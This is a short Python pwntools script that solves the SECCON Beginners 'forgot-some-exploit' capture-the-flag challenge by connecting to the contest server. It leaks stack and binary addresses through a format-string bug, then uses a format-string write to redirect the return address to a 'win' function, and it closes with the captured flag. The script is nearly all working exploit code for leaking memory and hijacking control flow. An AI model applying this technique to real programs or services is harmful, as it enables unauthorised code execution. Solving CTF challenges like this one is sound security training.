from pwn import *

# p = process('./chall')
p = remote('forgot-some-exploit.beginners.seccon.games', 9002)
# p = remote('localhost', 7777)
e = ELF('./chall')
context.binary = e
context.terminal = "bash"

p.sendline(b'%40$p.%41$p')
stack = int(p.recvuntil(b'.')[:-1], 16)
e.address = int(p.recvline()[:-1], 16) - e.symbols['main'] - 14
log.info(hex(stack))
log.info(hex(e.address))
p.sendline(fmtstr_payload(6, {stack-0x8: e.symbols['win']+1}))
p.interactive()

# ctf4b{4ny_w4y_y0u_w4nt_1t}
